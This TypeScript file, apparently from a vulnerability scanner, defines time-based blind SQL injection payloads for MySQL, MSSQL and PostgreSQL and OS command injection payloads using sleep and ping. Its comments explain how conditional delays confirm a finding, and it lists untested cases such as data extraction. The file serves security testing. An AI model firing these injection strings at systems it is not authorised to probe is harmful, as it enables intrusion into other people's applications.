// Time-based BLIND injection payloads (blind SQLi + OS command). Each template's effective server-side
// delay is (cond ? seconds : 0): `cond` flips the SQL boolean branch (IF/CASE) or the injected sleep
// duration. The SAME template therefore drives BOTH confirmation channels the probe needs —
//   - dose-response: cond=true at seconds=0 vs seconds=DELAY (delay scales with the injected value)
//   - conditional pair: seconds=DELAY at cond=true vs cond=false (delay is condition-controlled)
// so a match requires the delay to both SCALE and be CONDITIONAL — network jitter satisfies neither.
export interface TimePayload {
  family: "sqli" | "cmd"
  engine: string
  make: (cond: boolean, seconds: number) => string
}

const b = (cond: boolean) => (cond ? "1=1" : "1=2")
// WAITFOR/ping take whole seconds; fractional seconds (used only in tests) round up to ≥1 there.
const whole = (s: number) => Math.max(1, Math.round(s))

export const TIME_PAYLOADS: TimePayload[] = [
  { family: "sqli", engine: "mysql", make: (c, s) => `' AND IF(${b(c)},SLEEP(${s}),0)-- -` },
  { family: "sqli", engine: "mysql-numeric", make: (c, s) => `1 AND IF(${b(c)},SLEEP(${s}),0)` },
  { family: "sqli", engine: "mssql", make: (c, s) => `'; IF(${b(c)}) WAITFOR DELAY '0:0:${whole(s)}'-- -` },
  { family: "sqli", engine: "postgres", make: (c, s) => `';SELECT CASE WHEN ${b(c)} THEN pg_sleep(${s}) ELSE pg_sleep(0) END-- -` },
  { family: "cmd", engine: "unix", make: (c, s) => `; sleep ${c ? s : 0}` },
  { family: "cmd", engine: "unix-pipe", make: (c, s) => `| sleep ${c ? s : 0}` },
  { family: "cmd", engine: "unix-subshell", make: (c, s) => `$(sleep ${c ? s : 0})` },
  { family: "cmd", engine: "windows", make: (c, s) => `& ping -n ${c ? whole(s) + 1 : 1} 127.0.0.1 &` },
]

export const TIME_BLIND_NOT_TESTED: string[] = [
  "time-blind: OOB/DNS-callback confirmation (blind SSRF/XXE) — see the OOB collaborator",
  "time-blind: data EXTRACTION via conditional timing (agent's job on a confirmed lead)",
  "time-blind: heavy-query timing (no sleep primitive) and stacked-query-disabled engines",
]
